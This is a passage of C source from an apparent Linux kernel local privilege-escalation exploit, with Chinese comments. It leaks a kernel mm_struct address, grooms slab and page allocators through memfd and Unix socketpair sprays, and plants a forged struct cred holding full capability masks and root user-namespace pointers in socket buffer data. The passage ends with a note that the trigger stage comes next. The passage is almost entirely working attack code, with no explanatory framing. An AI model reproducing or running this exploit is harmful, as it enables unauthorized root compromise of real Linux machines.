        kernelsnitch_cleanup(ks); ks = NULL;
        for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) kill_child(prepare_ctx.childs[i]);
        cleanup_page_prepare_state();
        return 0;
    }
    pr_info("[+] ks leaked mm_struct = 0x%zx\n", (size_t)leaked);

    /* 7. 锚点 + payload */
    if (!pfem10_prepare_skb_payload(leaked, mode)) {
        kernelsnitch_cleanup(ks); ks = NULL;
        for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) kill_child(prepare_ctx.childs[i]);
        cleanup_page_prepare_state();
        return 0;
    }

    /* 8. 回收 socket + pcp_shaping 预热 (IonStack 实证顺序) */
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
    int sndbuf = 1 << 20;
    setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
    if (reclaim_flags >= 0) fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);

    int pcp_shaping_sv[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

    struct iovec iov;
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = skb_buf;
    iov.iov_len = PFEM10_PAYLOAD_SKB_SEND_SIZE;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

    pin_to_core(0);
    for (int i = 0; i < 4; i++) sched_yield();
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
        SYSCHK(close(pre_ctx.memfds[i]));
        pre_ctx.memfds[i] = -1;
    }
    for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
        SYSCHK(close(post_ctx.memfds[i]));
        post_ctx.memfds[i] = -1;
    }
    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
        SYSCHK(close(spray_ctx.memfds[i]));
        spray_ctx.memfds[i] = -1;
    }
    SYSCHK(close(pcp_shaping_sv[0]));
    SYSCHK(close(pcp_shaping_sv[1]));
    for (int i = 0; i < 4; i++) sched_yield();
    SYSCHK(close(memfd_leak));
    memfd_leak = -1;

    /* 9. 主喷: skb 数据回收锚点块, payload 存活于 reclaim_sv 队列 */
    for (int i = 0; i < PFEM10_PAYLOAD_SKB_RECLAIM_SENDS; i++) {
        errno = 0;
        ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
        if (sent <= 0) break;
    }

    /* ★ 2026-08-26 fix: isolated cred copy page on separate socketpair.
     * The main 64KB sendmsg allocates one contiguous block - both chunks are
     * physically adjacent. Moving cred copy to chunk 1 did not help.
     * A dedicated 32KB skb via separate socketpair gets an independent buddy
     * allocation. Even if the main page is partially reclaimed during chain
     * commit, this page stays pinned by its own socket queue. */
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cred_sv));
    int cred_sndbuf = 1 << 20;
    setsockopt(cred_sv[0], SOL_SOCKET, SO_SNDBUF, &cred_sndbuf, sizeof(cred_sndbuf));
    int cred_flags = fcntl(cred_sv[0], F_GETFL, 0);
    if (cred_flags >= 0) fcntl(cred_sv[0], F_SETFL, cred_flags | O_NONBLOCK);

    {
        unsigned char *cred_buf = malloc(PFEM10_PAYLOAD_ORDER3_SIZE);
        memset(cred_buf, 0x41, PFEM10_PAYLOAD_ORDER3_SIZE);
        unsigned char *cp = cred_buf + PFEM10_PAYLOAD_CRED_COPY_OFF;
        memset(cp, 0, PFEM10_CRED_SIZE);
        put32(cp, PFEM10_CRED_USAGE, 0x40000000);
        put32(cp, PFEM10_CRED_UID,     g_cred_uid);
        put32(cp, PFEM10_CRED_GID,     g_cred_uid);
        put32(cp, PFEM10_CRED_SUID,    g_cred_uid);
        put32(cp, PFEM10_CRED_SGID,    g_cred_uid);
        put32(cp, PFEM10_CRED_EUID,    g_cred_uid);
        put32(cp, PFEM10_CRED_EGID,    g_cred_uid);
        put32(cp, PFEM10_CRED_FSUID,   g_cred_uid);
        put32(cp, PFEM10_CRED_FSGID,   g_cred_uid);
        put64(cp, PFEM10_CRED_CAP_INHERITABLE, 0xFFFFFFFFFFFFFFFFULL);
        put64(cp, PFEM10_CRED_CAP_PERMITTED,  0xFFFFFFFFFFFFFFFFULL);
        put64(cp, PFEM10_CRED_CAP_EFFECTIVE,  0xFFFFFFFFFFFFFFFFULL);
        put64(cp, PFEM10_CRED_CAP_BSET,       0xFFFFFFFFFFFFFFFFULL);
        put64(cp, PFEM10_CRED_CAP_AMBIENT,    0xFFFFFFFFFFFFFFFFULL);
        put64(cp, PFEM10_CRED_USER,       p0_data_alias(PFEM10_OFF_ROOT_USER));
        put64(cp, PFEM10_CRED_USER_NS,    p0_data_alias(PFEM10_OFF_INIT_USER_NS));
        put64(cp, PFEM10_CRED_GROUP_INFO, p0_data_alias(PFEM10_OFF_INIT_GROUPS));
        uintptr_t sec_blob_addr = L.payload_base + PFEM10_PAYLOAD_ORDER3_SIZE + PFEM10_PAYLOAD_SECBLOB_OFF;
        put64(cp, PFEM10_CRED_SECURITY, sec_blob_addr);
        unsigned char *sb = cred_buf + PFEM10_PAYLOAD_SECBLOB_OFF;
        memset(sb, 0, 0x40);
        put32(sb, 0x00, 1);
        put32(sb, 0x04, 1);

        struct iovec cred_iov;
        cred_iov.iov_base = cred_buf;
        cred_iov.iov_len = PFEM10_PAYLOAD_ORDER3_SIZE;
        struct msghdr cred_msg;
        memset(&cred_msg, 0, sizeof(cred_msg));
        cred_msg.msg_iov = &cred_iov;
        cred_msg.msg_iovlen = 1;

        for (int i = 0; i < 4; i++) {
            errno = 0;
            ssize_t sent = sendmsg(cred_sv[0], &cred_msg, MSG_DONTWAIT);
            if (sent <= 0) break;
        }
        pr_info("[+] cred copy sprayed on dedicated cred_sv addr=0x%zx\n",
                (size_t)(L.payload_base + PFEM10_PAYLOAD_ORDER3_SIZE + PFEM10_PAYLOAD_CRED_COPY_OFF));
        free(cred_buf);
    }

    kernelsnitch_cleanup(ks);
    ks = NULL;

    /* 10. 清理 prepare 占位 */
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        SYSCHK(close(prepare_ctx.memfds[i]));
        prepare_ctx.memfds[i] = -1;
        kill_child(prepare_ctx.childs[i]);
    }

    pr_info("[+] sprayed: payload held in socket queue (reclaim_sv=[%d,%d])\n",
            reclaim_sv[0], reclaim_sv[1]);
    return L.base;
}

/* ------------------------- 重试包装 ----------------------------- */
static uintptr_t pfem10_prepare_good_kernel_page(int mode)
{
    int max_attempts = (mode == PFEM10_PAYLOAD_FOPS) ? 72 : 12;
    for (int attempt = 1; attempt <= max_attempts; attempt++) {
        uintptr_t base = pfem10_prepare_kernel_page(mode);
        if (base) return base;
        pr_warning("[!] prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
    }
    pr_warning("[!] prepare_kernel_page exhausted\n");
    return 0;
}

/* ------------------------- 入口 ----------------------------- */
int main(int argc, char **argv)
{
    int mode = PFEM10_PAYLOAD_SLIDE;
    if (argc > 1 && !strcmp(argv[1], "FOPS")) mode = PFEM10_PAYLOAD_FOPS;
    else if (argc > 1 && !strcmp(argv[1], "SLIDE")) mode = PFEM10_PAYLOAD_SLIDE;

    g_skb_data_delta = env_long("SKB_DATA_DELTA", PFEM10_PAYLOAD_SKB_DATA_DELTA_DEFAULT);
    char *k = getenv("KPHYS");
    if (k) g_kphys = strtoull(k, NULL, 0);
    g_ks_collisions = env_size("KSNITCH_COLLISIONS", PFEM10_PAYLOAD_KSNITCH_COLLISIONS_DEFAULT, 4, 64);
    g_prepare_slabs = env_size("PREPARE_SLABS", PFEM10_PAYLOAD_PREPARE_SLABS_DEFAULT, 8, 96);

    pr_info("pfem10_spray mode=%s delta=%lld kphys=0x%zx collisions=%zu slabs=%zu\n",
            mode == PFEM10_PAYLOAD_FOPS ? "FOPS" : "SLIDE",
            (long long)g_skb_data_delta, (size_t)g_kphys,
            g_ks_collisions, g_prepare_slabs);

    uintptr_t base = pfem10_prepare_good_kernel_page(mode);
    if (!base) { pr_error("spray failed\n"); return 1; }

    /* 堆喷成功 → 假 waiter 触发写原语 (fops.c / slide.c 移植, 下一阶段) */
    pr_info("[+] payload page ready at 0x%zx — trigger stage next\n", (size_t)base);
    sleep(3600);  /* 保持 skb 存活, 等待触发 */
    return 0;
}




